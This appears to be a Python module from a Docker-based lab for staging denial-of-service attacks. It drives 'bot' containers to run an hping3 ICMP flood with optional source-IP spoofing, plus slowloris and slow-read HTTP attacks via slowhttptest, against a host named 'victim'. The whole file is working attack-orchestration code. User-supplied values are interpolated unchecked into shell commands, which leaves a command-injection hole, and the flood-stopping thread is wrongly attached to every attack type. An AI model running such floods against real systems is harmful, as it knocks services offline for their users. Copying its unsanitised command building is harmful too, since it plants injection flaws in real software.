import docker, threading, sqlite3, time
from flask import request
from .settings import client
from app import db


def icmp_flood(container_id, ip_address=""):
    container = client.containers.get(container_id)
    if ip_address != "":  # If user wants to spoof src IP
        result = container.exec_run(f"hping3 --icmp --flood -a {ip_address} victim")
    else:
        result = container.exec_run("hping3 --icmp --flood victim")

    print(result.output.decode())


def slowloris(container_id, number_of_connections, connection_rate, attack_duration):
    container = client.containers.get(container_id)
    result = container.exec_run(
        f"slowhttptest -c {number_of_connections} -r {connection_rate} -l {attack_duration} -g -u http://victim"
    )
    print(result.output.decode())


def slow_read(
    container_id,
    number_of_connections,
    connection_rate,
    attack_duration,
    request_multiplier,
    read_interval,
    read_bytes,
    window_size_start,
    window_size_end,
):
    container = client.containers.get(container_id)
    result = container.exec_run(
        f"slowhttptest  -X -k {request_multiplier} -c {number_of_connections} -r {connection_rate} -l {attack_duration} -n {read_interval} -z {read_bytes} -w {window_size_start} -y {window_size_end} -g -u http://victim"
    )
    print(result.output.decode())


def stop_icmp_flood(container_id, attack_duration):
    time.sleep(attack_duration)
    container = client.containers.get(container_id)
    result = container.exec_run("pkill hping3")
    print(result.output.decode())


def execute_attacks(attack_info, attack_duration):
    container_ids = [x[0] for x in db.get_bot_ids()]

    # Create a dictionary to store the container ids for each attack
    attack_containers = {}

    # Loop through the attacks and divide the containers based on the number of containers specified in the attack_info dictionary
    for attack, attack_data in attack_info.items():
        attack_containers[attack] = container_ids[: attack_data["bots"]]
        container_ids = container_ids[attack_data["bots"] :]

    # Create a list of threads for each attack
    attack_threads = []

    # Loop through the attacks and create a thread for each attack
    for attack, attack_data in attack_info.items():
        containers = attack_containers[attack]
        results = db.get_attack_args(attack)
        args = []

        if results is not None:
            for result in results:
                args.append(result)

        for container_id in containers:
            attack_thread = threading.Thread(
                target=globals().get(attack), args=(container_id, *args)
            )
            attack_threads.append(attack_thread)
            attack_threads.append(
                threading.Thread(
                    target=stop_icmp_flood, args=(container_id, attack_duration)
                )
            )

    # Start all attack threads
    for attack_thread in attack_threads:
        attack_thread.start()

    # Wait for all threads to finish
    for attack_thread in attack_threads:
        attack_thread.join(timeout=attack_duration + 10)

    return "Attacks finished"
